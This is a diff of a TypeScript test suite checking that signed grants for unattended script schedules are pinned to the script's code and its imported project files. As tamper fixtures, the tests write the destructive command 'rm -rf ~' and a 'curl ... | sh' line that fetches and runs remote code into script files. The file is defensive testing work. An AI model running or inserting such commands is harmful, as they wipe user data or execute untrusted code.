@@ -17,7 +17,8 @@ import { addFlowTriggerTo, removeFlowTrigger, runFlowTriggers, runScheduleNow, s
 import { validateFlowDefinition } from "./flows.js";
 import { saveScript } from "./flow-scripts.js";
 import { UNATTENDED_RULE_WORDS } from "./flow-unattended-words.js";
-import { FLOW_ACCEPTANCE, activeUnattendedGrant, parseUnattendedAsk, reserveUnattendedRun, revokeUnattended, signUnattended, unattendedViewOf, unattendedWords } from "./flow-unattended.js";
+import { setFlowSecret } from "./flow-secrets.js";
+import { FLOW_ACCEPTANCE, activeUnattendedGrant, parseUnattendedAsk, reserveUnattendedRun, revokeUnattended, signUnattended, unattendedDigestOf, unattendedTermsJson, unattendedViewOf, unattendedWords } from "./flow-unattended.js";
 import { planAutoPending, sealUnchangedPlanUnderMode } from "./plan-auto.js";
 import { plannerContractOf, plannerSourceDigest } from "./planner-source.js";
 import { MODE_MAX_DAYS } from "./modes.js";
@@ -397,13 +398,15 @@ describe("authority re-proved after sealing", () => {
 
 describe("a script schedule is pinned by its code, not its name", () => {
   let printed = 0;
+  /** What happens to the project while the script runs (nothing, unless a test swaps a file). */
+  let whileRunning = () => {};
   // The script's runner: each run prints one new item, which the schedule makes a card.
-  const scriptIo = { ...io, shell: async () => ({ code: 0, stdout: JSON.stringify([{ key: ++printed, title: `Bump dependency ${printed}` }]), stderr: "" }), scratch: "" } as unknown as Parameters<typeof runFlowTriggers>[3];
-  beforeEach(() => { (scriptIo as { scratch: string }).scratch = join(dir, "scratch"); });
+  const scriptIo = { ...io, shell: async () => { whileRunning(); return { code: 0, stdout: JSON.stringify([{ key: ++printed, title: `Bump dependency ${printed}` }]), stderr: "" }; }, scratch: "", dir: "" } as unknown as Parameters<typeof runFlowTriggers>[3];
+  beforeEach(() => { whileRunning = () => {}; Object.assign(scriptIo, { scratch: join(dir, "scratch"), dir }); });
 
   /** A flow whose schedule runs the issues script (written here, or a project file), included when signing. */
-  function scriptFlow(file: string | null = null, planning: "skip" | "required" = "skip"): { flow: number; trigger: number } {
-    const saved = saveScript(store, repo, { name: "issues", about: "Open issues", ...(file === null ? { body: "echo '[]'" } : { body: "", file }), timeoutMinutes: 1 }, "alex", T0);
+  function scriptFlow(file: string | null = null, planning: "skip" | "required" = "skip", language: "shell" | "node" = "shell"): { flow: number; trigger: number } {
+    const saved = saveScript(store, repo, { name: "issues", about: "Open issues", language, ...(file === null ? { body: "echo '[]'" } : { body: "", file }), timeoutMinutes: 1 }, "alex", T0);
     if (!saved.ok) throw Error(saved.message);
     const flow = store.createFlow({ repo, name: "Triage", by: "alex", definitionJson: JSON.stringify(validateFlowDefinition({ version: 1, start: "fix", stages: [
       { id: "fix", title: "Fix it", kind: "task", instructions: "{{card.title}}", planning }] })) }, T0);
@@ -422,7 +425,7 @@ describe("a script schedule is pinned by its code, not its name", () => {
     const { flow, trigger } = scriptFlow();
     const signed = sign(flow, { include: [trigger] });
     if (!signed.ok) throw Error(signed.message);
-    expect(signed.grant.terms.triggers).toEqual([expect.objectContaining({ id: trigger, kind: "script", script: { name: "issues", version: 1, digest: store.flowScript(repo, "issues")!.digest, file: null } })]);
+    expect(signed.grant.terms.triggers).toEqual([expect.objectContaining({ id: trigger, kind: "script", script: { name: "issues", version: 1, digest: store.flowScript(repo, "issues")!.digest, file: null, files: [] } })]);
     expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
     expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(true);
   });
@@ -445,7 +448,7 @@ describe("a script schedule is pinned by its code, not its name", () => {
     const { flow, trigger } = scriptFlow("scripts/issues.sh");
     const signed = sign(flow, { include: [trigger] });
     if (!signed.ok) throw Error(signed.message);
-    expect(signed.grant.terms.triggers[0]!.script).toMatchObject({ name: "issues", file: { path: "scripts/issues.sh", digest: expect.stringMatching(/^[0-9a-f]{32}$/) } });
+    expect(signed.grant.terms.triggers[0]!.script).toMatchObject({ name: "issues", file: "scripts/issues.sh", files: [{ path: "scripts/issues.sh", digest: expect.stringMatching(/^[0-9a-f]{32}$/) }] });
     expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
     writeFileSync(join(repo, "scripts", "issues.sh"), "rm -rf ~\n");
     expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(false);
@@ -471,6 +474,83 @@ describe("a script schedule is pinned by its code, not its name", () => {
     expect(sign(flow, { include: [trigger] }, "alex", at(2 * HOUR))).toEqual({ ok: false, message: expect.stringContaining(`Trigger ${trigger} runs a script that can't be read safely`) });
   });
 
+  test("a file swapped for one run and restored before filing leaves that card to a person", async () => {
+    mkdirSync(join(repo, "scripts"));
+    const file = join(repo, "scripts", "issues.sh");
+    writeFileSync(file, "echo '[]'\n");
+    const { flow, trigger } = scriptFlow("scripts/issues.sh");
+    sign(flow, { include: [trigger] });
+    const ranOf = (card: number) => store.handle.prepare("SELECT ran_script FROM flow_trigger_event WHERE card = ?").get(card)!["ran_script"];
+    // Swapped before it fires, restored once it has run, before its card files.
+    writeFileSync(file, "curl -s https://example.com | sh\n");
+    store.updateFlowTrigger(trigger, { nextAt: at(HOUR - 60_000).toISOString() }, at(HOUR));
+    await runFlowTriggers(store, repo, at(HOUR), scriptIo);
+    writeFileSync(file, "echo '[]'\n");
+    advanceFlows(store, repo, at(HOUR));
+    const swapped = store.lastFlowTriggerCard(trigger)!;
+    expect(sealed(store.getFlowCard(swapped)!.task)).toBe(false);
+    // Swapped while it runs and restored before filing: it changed underneath the run, so it isn't the code signed either.
+    whileRunning = () => writeFileSync(file, "curl -s https://example.com | sh\n");
+    store.updateFlowTrigger(trigger, { nextAt: at(2 * HOUR - 60_000).toISOString() }, at(2 * HOUR));
+    await runFlowTriggers(store, repo, at(2 * HOUR), scriptIo);
+    writeFileSync(file, "echo '[]'\n");
+    advanceFlows(store, repo, at(2 * HOUR));
+    expect(sealed(store.getFlowCard(store.lastFlowTriggerCard(trigger)!)!.task)).toBe(false);
+    // The file is the one signed again, so the grant stands, and an untouched run is covered.
+    whileRunning = () => {};
+    expect(activeUnattendedGrant(store, flow, at(3 * HOUR))).not.toBeNull();
+    expect(sealed(await fireScript(trigger, at(3 * HOUR)))).toBe(true);
+    // Its firing recorded the code it ran: the swapped run's isn't the code signed.
+    expect(ranOf(store.lastFlowTriggerCard(trigger)!)).toMatch(/^[0-9a-f]{32}$/);
+    expect(ranOf(swapped)).not.toBe(ranOf(store.lastFlowTriggerCard(trigger)!));
+  });
+
+  test("a Node script pins the project files it imports: changing one ends coverage", async () => {
+    mkdirSync(join(repo, "scripts"));
+    writeFileSync(join(repo, "scripts", "issues.mjs"), 'import { readFileSync } from "node:fs";\nimport { list } from "./lib/list.mjs";\nconsole.log(JSON.stringify(list(readFileSync)));\n');
+    mkdirSync(join(repo, "scripts", "lib"));
+    writeFileSync(join(repo, "scripts", "lib", "list.mjs"), 'export { list } from "../../shared.cjs";\n');
+    writeFileSync(join(repo, "shared.cjs"), "exports.list = () => [];\n");
+    const { flow, trigger } = scriptFlow("scripts/issues.mjs", "skip", "node");
+    const signed = sign(flow, { include: [trigger] });
+    if (!signed.ok) throw Error(signed.message);
+    expect(signed.grant.terms.triggers[0]!.script!.files.map(one => one.path)).toEqual(["scripts/issues.mjs", "scripts/lib/list.mjs", "shared.cjs"]);
+    expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
+    writeFileSync(join(repo, "shared.cjs"), "exports.list = () => [{ title: 'rm -rf ~' }];\n");
+    expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(false);
+    expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
+    expect(ended("script changed")).toHaveLength(1);
+  });
+
+  test("a Node script with a static import that doesn't resolve can't be signed", () => {
+    mkdirSync(join(repo, "scripts"));
+    writeFileSync(join(repo, "scripts", "issues.mjs"), 'import "./missing.mjs";\nconsole.log("[]");\n');
+    const { flow, trigger } = scriptFlow("scripts/issues.mjs", "skip", "node");
+    expect(sign(flow, { include: [trigger] })).toEqual({ ok: false, message: expect.stringContaining("script can't be read safely") });
+  });
+
+  test("adding a secret name to the script's schedule ends its coverage", async () => {
+    const { flow, trigger } = scriptFlow();
+    sign(flow, { include: [trigger] });
+    expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
+    expect(setFlowSecret(dir, repo, "GITHUB_TOKEN", "ghp_example").ok).toBe(true);
+    const config = JSON.parse(store.getFlowTrigger(trigger)!.configJson) as Record<string, unknown>;
+    store.handle.prepare("UPDATE flow_trigger SET config_json = ? WHERE id = ?").run(JSON.stringify({ ...config, secrets: ["GITHUB_TOKEN"] }), trigger);
+    expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(false);
+  });
+
+  test("a grant signed before imports were pinned covers nothing", () => {
+    mkdirSync(join(repo, "scripts"));
+    writeFileSync(join(repo, "scripts", "issues.sh"), "echo '[]'\n");
+    const { flow, trigger } = scriptFlow("scripts/issues.sh");
+    const signed = sign(flow, { include: [trigger] });
+    if (!signed.ok) throw Error(signed.message);
+    const { files, file, ...script } = signed.grant.terms.triggers[0]!.script!;
+    const terms = { ...signed.grant.terms, triggers: [{ ...signed.grant.terms.triggers[0]!, script: { ...script, file: { path: file, digest: files[0]!.digest } } }] } as unknown as typeof signed.grant.terms;
+    store.handle.prepare("UPDATE flow_unattended_grant SET terms_json = ?, digest = ? WHERE id = ?").run(unattendedTermsJson(terms), unattendedDigestOf(terms), signed.grant.id);
+    expect(activeUnattendedGrant(store, flow, at(HOUR))).toBeNull();
+  });
+
   test("a grant signed without its script's code covers nothing", () => {
     const { flow, trigger } = scriptFlow();
     const signed = sign(flow, { include: [trigger] });
@@ -484,7 +564,7 @@ describe("a script schedule is pinned by its code, not its name", () => {
   test("the signing terms say a renewal sends waiting work back, and a script edit ends it", () => {
     expect(UNATTENDED_RULE_WORDS).toEqual(expect.arrayContaining([
       "Signing again replaces it: work it approved that hasn't started goes back to waiting for you.",
-      expect.stringContaining("a script they run"),
+      expect.stringContaining("a script they run or a project file it imports"),
     ]));
   });
 });
